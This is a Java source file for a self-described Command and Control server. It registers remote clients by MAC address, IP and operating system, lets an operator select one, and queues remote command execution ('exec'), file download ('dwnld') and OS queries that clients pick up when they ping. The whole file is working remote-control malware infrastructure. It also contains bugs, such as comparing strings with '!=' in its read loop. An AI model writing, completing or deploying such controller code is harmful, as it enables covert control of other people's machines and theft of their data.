package server;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.HashMap;

import tools.Command;
import tools.Log;
import tools.ParsedCommand;

/**
 * Represents a Command and Control (C&C) server
 * 
 * @author Yohan Chalier
 *
 */
public class CommandServer implements RequestHandler, CommandHandler {
	
	// The string sent when no matching command is found
	public static final String ERROR_COMMAND_NOT_FOUND = "Command not found.";
	
	// The sets of commands for both the server and the client
	private final HashMap<String, Command> cmdsServer;
	private final HashMap<String, Command> cmdsClient;
	
	// The set of connected clients IPs
	private ClientPool clients;
	private int currentClient = -1;
	
	// Log requests
	private Log log;
	
	public CommandServer() {
		log = new Log();
		
		try {
			clients = new ClientPool();
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		
		cmdsServer = new HashMap<String, Command>();
		cmdsClient = new HashMap<String, Command>();
		
		
		
		// ***** GENERAL SEVER COMMANDS ***** //
		
		// Display available commands
		cmdsServer.put("help", new Command(){
			
			@Override
			public String exec(ParsedCommand pCmd) {
				StringBuilder builder = new StringBuilder();
				
				for (String key: cmdsServer.keySet())
					builder.append(key + '\n');
				
				// Removing last '\n'
				builder.setCharAt(builder.length() - 1, (char) 0);
				
				return builder.toString();
			}
			
		});
		
		// Close user input
		cmdsServer.put("exit", new Command(){
			
			@Override
			public String exec(ParsedCommand pCmd) {
				return null;
			}
			
		});
		
		// List all connected clients
		cmdsServer.put("list", new Command(){
			
			@Override
			public String exec(ParsedCommand pCmd) {
				
				StringBuilder sb = new StringBuilder();
				sb.append("id  \tMAC address      \tIP address    \tOS\n");
				
				for (int id: clients.keySet()) {
					sb.append(id + "\t"
							+ clients.get(id).getMACAddress() + "\t"
							+ clients.get(id).getInetAddress() + "\t"
							+ clients.get(id).getOs() + "\n");
				}
				
				// Removing last '\n'
				sb.setCharAt(sb.length() - 1, (char) 0);
				
				return sb.toString();
			}
			
		});
		
		// Select a client to 'exec' commands
		cmdsServer.put("select", new Command(){
			
			@Override
			public String exec(ParsedCommand pCmd) {
				if (pCmd.args.length != 1)
					return "Usage: select ID";
				int id = Integer.parseInt(pCmd.args[0]);
				if (clients.containsKey(id)) {
					currentClient = id;
					return "Selected client " + id;
				}
				return "Wrong id.";
			}
			
		});
		
		// Unselect a client
		cmdsServer.put("unselect", new Command(){

			@Override
			public String exec(ParsedCommand pCmd) {
				currentClient = -1;
				return "Client unselected.";
			}
			
		});
		
		// Show log
		cmdsServer.put("log", new Command(){
			
			@Override
			public String exec(ParsedCommand pCmd) {
				if (pCmd.args.length > 0)
					return log.getText(Integer.parseInt(pCmd.args[0]));
				return log.getText();
			}
			
		});
		
		// Save clients
		cmdsServer.put("save_clients", new Command(){

			@Override
			public String exec(ParsedCommand pCmd) {
				
				try {
					return clients.save("clients");
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				return null;
			}
			
		});
		
		// Display client info
		cmdsServer.put("info", new Command(){

			@Override
			public String exec(ParsedCommand pCmd) {
				if (currentClient >= 0) {					
					return clients.get(currentClient).toString();
				}
				return "No selected client.";
			}
			
		});
		
		
		
		// ***** CONNECTED CLIENT COMMANDS ***** //
		
		// Execute a command
		cmdsServer.put("exec", new ClientCommand(this, "EXEC"));
		
		// Download a file
		cmdsServer.put("dwnld", new ClientCommand(this, "DWNLD"));
		
		// Retrieve OS
		cmdsServer.put("os", new ClientCommand(this, "OS"));
		
		
		
		// ***** CLIENT REQUESTS COMMANDS ***** //
		
		// Assign an ID to a client
		cmdsClient.put("GETID", new Command(){
			
			@Override
			public String exec(ParsedCommand pCmd) {
				
				ConnectedClient client = clients.findByMac(pCmd.args[0]);
				int id;
				
				if (client != null) // Already known client
					id = client.getId(); 
				else				// New client
					id = clients.addClient(pCmd.args[0]);
				
				// Storing IP
				clients.get(id).setInetAddress(pCmd.args[1]);
				
				// Storing OS
				clients.get(id).setOs(pCmd.argLine(2));
				
				return Integer.toString(id);
			}
			
		});
		
		// Answer a ping
		cmdsClient.put("PING", new Command(){
			
			@Override
			public String exec(ParsedCommand pCmd) {
				ConnectedClient client;
				if ((client = clients.identify(pCmd.args[0])) != null
						&& client.hasCmd()) {
					return client.popCmd();
				}
				return "PONG";
			}
			
		});
		
		cmdsClient.put("OUT", new Command(){

			@Override
			public String exec(ParsedCommand pCmd) {
				
				System.out.println(pCmd);
				
				return "";
			}
			
		});
		
	}

	@Override
	public void handle(Socket socket)
			throws IOException {
		
		// Opening in/out streams
		InputStream inputStream = socket.getInputStream();
		BufferedReader in = new BufferedReader(
				new InputStreamReader(inputStream));
		PrintWriter out = new PrintWriter(socket.getOutputStream());
		
		// Payload length
		int payloadLength = Integer.parseInt(in.readLine());
		StringBuilder payload = new StringBuilder();
		
		// Reading request
		String request = in.readLine();
		
		if (payloadLength > 0) {
			String line;
			while ((line = in.readLine()) != "") {
				System.out.println(line);
				payload.append(line);
			}
		}
		
		// Logging request
		log.add(0, socket.getInetAddress() + "\t" + request);
		
		// Executing command
		ParsedCommand pCmd = new ParsedCommand(request, payload.toString());
		if (cmdsClient.containsKey(pCmd.cmd)) {
			String response = cmdsClient.get(pCmd.cmd).exec(pCmd);
			log.add(1, socket.getInetAddress() + "\t" + response);
			out.println(response);
			out.flush();
		}
		
		// Closing all streams
		in.close();
		out.close();
		inputStream.close();

	}

	@Override
	public String executeCommand(String cmd) {
		ParsedCommand pCmd = new ParsedCommand(cmd);
		if (cmdsServer.containsKey(pCmd.cmd))
			return cmdsServer.get(pCmd.cmd).exec(pCmd);
		return ERROR_COMMAND_NOT_FOUND;
	}

	@Override
	public String getPrefix() {
		if (currentClient >= 0) return Integer.toString(currentClient);
		return "";
	}
	
	public int getCurrentClient() {
		return currentClient;
	}
	
	public ClientPool getClients() {
		return clients;
	}
	
}
